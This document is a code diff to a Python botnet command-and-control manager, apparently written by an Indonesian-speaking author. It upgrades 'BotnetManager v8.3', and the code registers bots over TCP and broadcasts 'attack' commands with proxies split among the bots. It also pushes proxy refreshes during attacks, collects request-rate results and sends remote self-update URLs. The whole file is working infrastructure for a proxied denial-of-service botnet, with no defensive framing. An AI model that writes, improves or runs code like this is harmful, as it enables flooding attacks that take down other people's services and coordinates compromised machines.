@@ -18,8 +18,6 @@ from app.managers.proxy_manager import proxy_manager
 # OPTIMAL PROXY DISTRIBUTION CONFIG
 # ================================================================
 class ProxyDistributionConfig:
-    """Optimal proxy distribution untuk berbagai situasi attack."""
-
     HIGH_BOT_HIGH_PROXY = {
         "max_proxies_per_bot": 200,
         "min_proxies_per_bot": 50,
@@ -67,16 +65,9 @@ class ProxyDistributionConfig:
 
 
 # ================================================================
-# BOTNET MANAGER v8.2 — OPTIMAL, FIXED & MAXIMIZED
+# BOTNET MANAGER v8.3 — OPTIMAL, FIXED & MAXIMIZED
 # ================================================================
 class BotnetManager:
-    """
-    Manages bot connections, commands, and stats.
-    - Handles TCP messages from bots
-    - Sends commands to bots with OPTIMAL proxy distribution
-    - Tracks bot status using Redis and active writers
-    """
-
     def __init__(self):
         self.active_writers: Dict[str, asyncio.StreamWriter] = {}
         self._lock = asyncio.Lock()
@@ -84,8 +75,15 @@ class BotnetManager:
         self._running = False
         self._last_seen: Dict[str, int] = {}
         self._proxy_config = ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
+        self._attack_manager = None  # Lazy loaded
 
-    # ===================== PUBLIC API =====================
+    @property
+    def attack_manager(self):
+        """Lazy load attack_manager to avoid circular import."""
+        if self._attack_manager is None:
+            from app.managers.attack_manager import attack_manager
+            self._attack_manager = attack_manager
+        return self._attack_manager
 
     async def start(self):
         if self._running:
@@ -114,7 +112,6 @@ class BotnetManager:
         logger.info("BotnetManager stopped.")
 
     async def handle_message(self, writer: asyncio.StreamWriter, msg: dict):
-        """FIXED: Add error handling for messages without 'type' field."""
         msg_type = msg.get("type")
         bot_id = msg.get("id")
 
@@ -128,10 +125,8 @@ class BotnetManager:
 
         bot_id = bot_id.strip()
         
-        # FIXED: Handle messages without type field gracefully
         if not msg_type:
             logger.debug(f"Message from {bot_id} without type field. Keys: {list(msg.keys())}")
-            # Try to infer type from other fields
             if "cmd" in msg:
                 msg_type = "command"
             else:
@@ -139,7 +134,6 @@ class BotnetManager:
                 return
 
         logger.info(f"📩 Received {msg_type} from bot {bot_id}")
-
         self._last_seen[bot_id] = int(time.time())
 
         if msg_type == "register":
@@ -162,7 +156,6 @@ class BotnetManager:
             logger.warning(f"Unknown message type from {bot_id}: {msg_type}")
 
     def _get_optimal_config(self, bot_count: int, proxy_count: int) -> dict:
-        """Auto-detect scenario terbaik berdasarkan bot count dan proxy count."""
         if bot_count <= 3 and proxy_count >= 1500:
             return ProxyDistributionConfig.LOW_BOT_HIGH_PROXY
         elif bot_count >= 10 and proxy_count <= 1000:
@@ -172,19 +165,13 @@ class BotnetManager:
         else:
             return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
 
-    # FIX: OPTIMAL proxy distribution dengan proper command format & error handling
     async def broadcast_attack_with_proxies(self, attack_data: dict, proxies: List[str]) -> dict:
-        """
-        Broadcast attack ke SEMUA bot dengan OPTIMAL proxy distribution.
-        """
         async with self._lock:
             if not self.active_writers:
                 logger.warning("[ATTACK] No bots connected!")
                 return {"status": "failed", "reason": "no_bots", "bots": 0}
-
             bot_count = len(self.active_writers)
 
-        # Auto-detect optimal config
         config = self._get_optimal_config(bot_count, len(proxies))
         self._proxy_config = config
 
@@ -200,7 +187,6 @@ class BotnetManager:
 
         random.shuffle(proxies)
 
-        # FIXED: Get bot list once to avoid double-locking
         async with self._lock:
             bot_list = list(self.active_writers.items())
 
@@ -219,7 +205,6 @@ class BotnetManager:
             else:
                 bot_proxies = proxies[start_idx:end_idx]
 
-            # FIXED: Command format yang benar untuk bot
             bot_attack_cmd = {
                 "type": "command",
                 "cmd": "attack",
@@ -238,13 +223,13 @@ class BotnetManager:
                 success = await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "\n")
                 if success:
                     sent_count += 1
-                    logger.debug(f"[ATTACK] Sent attack command to bot {bot_id} with {len(bot_proxies)} proxies")
+                    logger.info(f"[ATTACK] ✅ Sent attack command to bot {bot_id} with {len(bot_proxies)} proxies")
                 else:
                     failed_count += 1
-                    logger.warning(f"[ATTACK] Failed to send to bot {bot_id} (writer error)")
+                    logger.warning(f"[ATTACK] ❌ Failed to send to bot {bot_id} (writer error)")
             except Exception as e:
                 failed_count += 1
-                logger.error(f"[ATTACK] Failed to send to bot {bot_id}: {e}")
+                logger.error(f"[ATTACK] ❌ Failed to send to bot {bot_id}: {e}")
 
         logger.info(f"[ATTACK] Launched: {sent_count} bots, {failed_count} failed, "
                     f"{len(proxies)} proxies, {proxies_per_bot}/bot")
@@ -259,19 +244,15 @@ class BotnetManager:
         }
 
     def _get_mode_name(self, config: dict) -> str:
-        """Get mode name for logging."""
         for name, cfg in vars(ProxyDistributionConfig).items():
             if isinstance(cfg, dict) and cfg == config:
                 return name
         return "CUSTOM"
 
-    # FIX: OPTIMAL mid-attack proxy refresh dengan proper command format
     async def broadcast_proxy_refresh(self, attack_id: str, proxies: List[str]) -> dict:
-        """Broadcast proxy_refresh dengan optimal settings."""
         async with self._lock:
             if not self.active_writers:
                 return {"status": "failed", "reason": "no_bots"}
-
             bot_count = len(self.active_writers)
 
         config = self._proxy_config
@@ -283,7 +264,6 @@ class BotnetManager:
 
         random.shuffle(proxies)
 
-        # FIXED: Get bot list once
         async with self._lock:
             bot_list = list(self.active_writers.items())
 
@@ -318,10 +298,7 @@ class BotnetManager:
         logger.info(f"[REFRESH] Sent to {sent_count} bots for attack {attack_id}")
         return {"status": "refreshed", "bots": sent_count}
 
-    # FIXED: Eliminate double-locking, add retry mechanism
     async def broadcast_command(self, command: dict, exclude: Optional[List[str]] = None):
-        """Send a command to all connected bots."""
-        # FIXED: Get all data in single lock acquisition
         async with self._lock:
             valid_items = [
                 (bid, w) for bid, w in self.active_writers.items()
@@ -336,14 +313,12 @@ class BotnetManager:
 
         logger.info(f"Broadcasting command '{command.get('cmd')}' to {len(writers)} bots: {bot_ids}")
 
-        # FIXED: Wrap command dengan type jika belum ada
         if "type" not in command:
             command["type"] = "command"
             
         cmd_json = json.dumps(command) + "\n"
         excluded_set = set(exclude) if exclude else set()
         
-        # FIXED: Send without re-acquiring lock
         tasks = []
         for bot_id, writer in zip(bot_ids, writers):
             if bot_id in excluded_set:
@@ -355,23 +330,18 @@ class BotnetManager:
             success_count = sum(1 for r in results if r is True)
             logger.info(f"Broadcast complete: {success_count}/{len(tasks)} bots reached")
 
-    # FIXED: Send to specific bot with retry
     async def send_to_bot(self, bot_id: str, command: dict) -> bool:
-        """Send a command to a specific bot."""
         async with self._lock:
             writer = self.active_writers.get(bot_id)
             if not writer or writer.is_closing():
                 return False
         
-        # FIXED: Wrap command dengan type
         if "type" not in command:
             command["type"] = "command"
         cmd_json = json.dumps(command) + "\n"
         return await self._send_with_retry(writer, cmd_json, bot_id)
 
-    # NEW: Retry mechanism for sending data
     async def _send_with_retry(self, writer: asyncio.StreamWriter, data: str, bot_id: str, max_retries: int = 2) -> bool:
-        """Send data to writer with retry mechanism."""
         for attempt in range(max_retries):
             try:
                 writer.write(data.encode())
@@ -407,7 +377,6 @@ class BotnetManager:
         )
 
     async def update_proxies_for_bots(self):
-        """Send updated proxy list to all bots."""
         proxies = await proxy_manager.get_alive_proxies()
         proxy_strings = [str(p) for p in proxies]
         command = {
@@ -419,7 +388,6 @@ class BotnetManager:
         logger.info(f"Sent proxy update ({len(proxy_strings)} proxies) to all bots.")
 
     async def update_self_for_bots(self, url: str):
-        """Send self-update command to all bots."""
         command = {
             "type": "command",
             "cmd": "update_self",
@@ -429,7 +397,6 @@ class BotnetManager:
         logger.info(f"Sent self-update command to all bots: {url}")
 
     async def remove_bot_on_disconnect(self, bot_id: str):
-        """Remove bot immediately when its TCP connection drops."""
         async with self._lock:
             writer = self.active_writers.pop(bot_id, None)
             if writer:
@@ -445,8 +412,6 @@ class BotnetManager:
         bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
         await redis.hset(bot_key, "last_heartbeat", 0)
         log_bot_event(bot_id, "disconnected", {"reason": "connection_lost"})
-
-    # ===================== INTERNAL HANDLERS =====================
 
     async def _handle_register(self, writer: asyncio.StreamWriter, msg: dict):
         bot_id = msg.get("id", "").strip()
@@ -498,8 +463,6 @@ class BotnetManager:
         await redis.hset(bot_key, "last_heartbeat", now)
 
     async def _handle_attack_result(self, msg: dict):
-        from app.managers.attack_manager import attack_manager
-
         bot_id = msg.get("id")
         attack_id = msg.get("attack_id")
         total_requests = msg.get("total_requests", 0)
@@ -514,12 +477,14 @@ class BotnetManager:
         logger.info(f"📊 Final result from {bot_id} for {attack_id}: {total_requests} reqs, {rps} RPS, "
                     f"proxy={proxy_requests}, direct={direct_requests}")
 
-        if attack_id in attack_manager.active_attacks:
-            attack = attack_manager.active_attacks.get(attack_id)
+        # FIX: Use lazy-loaded attack_manager
+        attack_mgr = self.attack_manager
+        if attack_id in attack_mgr.active_attacks:
+            attack = attack_mgr.active_attacks.get(attack_id)
             if attack:
                 attack.total_requests = total_requests
                 attack.rps = rps
-                await attack_manager._save_attack_to_redis(attack)
+                await attack_mgr._save_attack_to_redis(attack)
                 log_bot_event(bot_id, "attack_completed", {
                     "attack_id": attack_id,
                     "total_requests": total_requests,
@@ -533,8 +498,6 @@ class BotnetManager:
         await redis.incrby(total_req_key, total_requests)
 
     async def _handle_attack_progress(self, msg: dict):
-        from app.managers.attack_manager import attack_manager
-
         bot_id = msg.get("id")
         attack_id = msg.get("attack_id")
         delta_requests = msg.get("delta_requests", 0)
@@ -553,17 +516,16 @@ class BotnetManager:
         logger.debug(f"📈 Progress from {bot_id} for {attack_id}: +{delta_requests} reqs, "
                      f"{current_rps} RPS, proxy={proxy_requests}, pool={proxy_pool_alive}")
 
-        if attack_id in attack_manager.active_attacks:
-            attack = attack_manager.active_attacks.get(attack_id)
+        # FIX: Use lazy-loaded attack_manager
+        attack_mgr = self.attack_manager
+        if attack_id in attack_mgr.active_attacks:
+            attack = attack_mgr.active_attacks.get(attack_id)
             if attack:
                 attack.total_requests += delta_requests
                 attack.rps = current_rps
-                await attack_manager._save_attack_to_redis(attack)
-
-    # ===================== SEND HELPERS =====================
+                await attack_mgr._save_attack_to_redis(attack)
 
     async def _send_to_writer(self, writer: asyncio.StreamWriter, data: str) -> bool:
-        """Legacy send method - kept for compatibility."""
         try:
             writer.write(data.encode())
             await writer.drain()
@@ -571,8 +533,6 @@ class BotnetManager:
         except Exception as e:
             logger.error(f"Error sending to writer: {e}")
             return False
-
-    # ===================== CLEANUP =====================
 
     async def _cleanup_loop(self):
         while self._running:
@@ -640,8 +600,6 @@ class BotnetManager:
         await redis.hset(bot_key, "last_heartbeat", 0)
 
         log_bot_event(bot_id, "disconnected", {"reason": "stale heartbeat"})
-
-    # ===================== STATUS =====================
 
     async def get_active_bot_ids(self) -> List[str]:
         async with self._lock:
